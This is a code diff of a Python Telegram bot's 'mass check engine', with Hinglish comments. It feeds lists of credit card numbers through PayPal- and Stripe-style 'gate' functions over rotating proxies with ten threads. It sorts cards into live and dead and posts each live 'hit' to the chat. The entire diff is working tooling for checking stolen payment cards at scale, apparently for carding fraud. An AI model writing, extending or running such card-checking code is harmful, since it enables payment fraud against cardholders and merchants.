@@ -481,21 +481,22 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
         except Exception as e:
             bot.send_message(call.message.chat.id, f"❌ Error: {e}")
 # ============================================================================
-# 🧠 MASS CHECK ENGINE
+# 🧠 MASS CHECK ENGINE (FULL VERSION)
 # ============================================================================
 
 def process_mass_gate_check(bot, message, ccs, gate_func, gate_name, proxies):
     """
-    Generic mass check for API gates (PayPal, Stripe, etc.)
-    FIXED: Now properly shows errors in bot instead of silent crashes
+    Full version with Progress Bar, Live Hits, and Error Handling.
     """
     total = len(ccs)
+    # Results dictionary initialize kar rahe hain
     results = {"live": [], "dead": [], "error": []}
     
+    # 1. Starting Message bhejna
     try:
         status_msg = bot.send_message(
             message.chat.id,
-            f"<b>✅ {gate_name} Started...</b>\n"
+            f"<b>⚡ {gate_name} Started...</b>\n"
             f"💳 Cards: {total}\n"
             f"🌐 Proxies: {len(proxies)}",
             parse_mode="HTML"
@@ -505,109 +506,103 @@ def process_mass_gate_check(bot, message, ccs, gate_func, gate_name, proxies):
 
     processed = 0
     start_time = time.time()
-    last_update = time.time()
+    last_update_time = time.time()
 
+    # --- Worker Function (Jo har card ko check karega) ---
     def worker(cc):
-        """Worker function for each card check"""
+        if not proxies:
+            return {"cc": cc, "response": "No Proxies", "status": "ERROR"}
+            
         proxy = random.choice(proxies)
+        
         try:
-            # Call gate function - MUST return (response_text, status)
+            # Gate function call (ccs aur proxy pass karke)
             response_text, status = gate_func(cc, proxy)
+            
             return {
                 "cc": cc,
                 "response": response_text,
                 "status": status,
                 "gateway": gate_name,
-                "price": "N/A",
-                "site_url": "API"
+                "site_url": "API" # Ya fir gate_func se URL return karwa sakte hain
             }
         except Exception as e:
-            # Catch worker-level crashes and return as ERROR
-            error_msg = f"Crash: {str(e)[:100]}"
-            print(f"❌ WORKER CRASH [{cc}]: {traceback.format_exc()}")
             return {
                 "cc": cc,
-                "response": error_msg,
+                "response": str(e),
                 "status": "ERROR",
                 "gateway": gate_name,
-                "price": "N/A",
                 "site_url": "API"
             }
 
-    # Run checks concurrently
+    # 2. Multi-threading start (Fast checking ke liye)
     with ThreadPoolExecutor(max_workers=10) as executor:
         futures = {executor.submit(worker, cc): cc for cc in ccs}
         
         for future in as_completed(futures):
-            cc = futures[future]
             processed += 1
+            cc = futures[future]
             
             try:
-                res_obj = future.result()
-                status = res_obj["status"]
+                res = future.result()
+                status = res["status"]
                 
-                # Categorize results
-                if status == "APPROVED":
-                    results["live"].append(res_obj)
-                    send_hit(bot, message.chat.id, res_obj, f"✅ {gate_name} LIVE")
+                # 3. Result Categorization
+                if status == "APPROVED" or status == "CHARGED" or "CVV" in status:
+                    results["live"].append(res)
+                    # Live hit turant bhejo
+                    send_hit(bot, message.chat.id, res, f"✅ {gate_name} LIVE")
+                    
                 elif status == "DECLINED":
-                    results["dead"].append(res_obj)
-                else:  # ERROR
-                    results["error"].append(res_obj)
-                    # ⚠️ SHOW ERROR IN BOT (NEW)
-                    try:
-                        bot.send_message(
-                            message.chat.id,
-                            f"⚠️ <b>ERROR</b>\n"
-                            f"<code>{res_obj['cc']}</code>\n"
-                            f"<b>Reason:</b> {res_obj['response']}",
-                            parse_mode="HTML"
-                        )
-                    except:
-                        pass
-                        
+                    results["dead"].append(res)
+                else:
+                    results["error"].append(res)
+            
             except Exception as e:
-                # Fallback if result retrieval fails
-                print(f"❌ Result processing error [{cc}]: {e}")
-                results["error"].append({
-                    "cc": cc,
-                    "response": f"Process Error: {str(e)[:50]}",
-                    "status": "ERROR"
-                })
+                # Agar worker crash ho jaye
+                results["error"].append({"cc": cc, "response": str(e), "status": "ERROR"})
 
-            # Update UI every 3 seconds
-            if time.time() - last_update >= 3 or processed == total:
-                msg = (
-                    f"<b>⚡ {gate_name} Checking...</b>\n"
-                    f"{create_progress_bar(processed, total)}\n"
-                    f"📊 Progress: {processed}/{total}\n"
-                    f"✅ Live: {len(results['live'])}\n"
-                    f"❌ Dead: {len(results['dead'])}\n"
-                    f"⚠️ Errors: {len(results['error'])}"
-                )
+            # 4. Update UI (Har 2-3 second mein message edit karna)
+            if time.time() - last_update_time > 2.5 or processed == total:
                 try:
-                    bot.edit_message_text(msg, message.chat.id, status_msg.message_id, parse_mode="HTML")
-                    last_update = time.time()
-                except:
-                    pass
+                    # Progress bar banana
+                    progress = create_progress_bar(processed, total)
+                    
+                    msg_text = (
+                        f"<b>⚡ {gate_name} Checking...</b>\n"
+                        f"{progress}\n"
+                        f"📊 <b>Progress:</b> {processed}/{total}\n"
+                        f"✅ <b>Live:</b> {len(results['live'])}\n"
+                        f"❌ <b>Dead:</b> {len(results['dead'])}\n"
+                        f"⚠️ <b>Errors:</b> {len(results['error'])}"
+                    )
+                    
+                    bot.edit_message_text(
+                        msg_text, 
+                        message.chat.id, 
+                        status_msg.message_id, 
+                        parse_mode="HTML"
+                    )
+                    last_update_time = time.time()
+                except Exception:
+                    pass # Agar edit fail ho jaye (rate limit) to ignore karein
 
-    # Final summary
+    # 5. Final Summary Message
     duration = time.time() - start_time
-    final_msg = (
+    final_text = (
         f"<b>✅ {gate_name} Completed</b>\n"
         f"━━━━━━━━━━━━━━━━\n"
-        f"💳 <b>Total:</b> {total}\n"
+        f"💳 <b>Total Checked:</b> {total}\n"
         f"✅ <b>Live:</b> {len(results['live'])}\n"
         f"❌ <b>Dead:</b> {len(results['dead'])}\n"
         f"⚠️ <b>Errors:</b> {len(results['error'])}\n"
-        f"⏱️ <b>Time:</b> {duration:.2f}s"
+        f"⏱️ <b>Time Taken:</b> {duration:.2f}s"
     )
     
     try:
-        bot.edit_message_text(final_msg, message.chat.id, status_msg.message_id, parse_mode="HTML")
+        bot.edit_message_text(final_text, message.chat.id, status_msg.message_id, parse_mode="HTML")
     except:
-        bot.send_message(message.chat.id, final_msg, parse_mode="HTML")
-
+        bot.send_message(message.chat.id, final_text, parse_mode="HTML")
 # ============================================================================
 # 📩 MESSAGING
 # ============================================================================
@@ -672,6 +667,7 @@ def send_final(bot, chat_id, mid, total, results, duration):
     try: bot.edit_message_text(msg, chat_id, mid, parse_mode='HTML')
 
     except: bot.send_message(chat_id, msg, parse_mode='HTML')
+
 
 
 
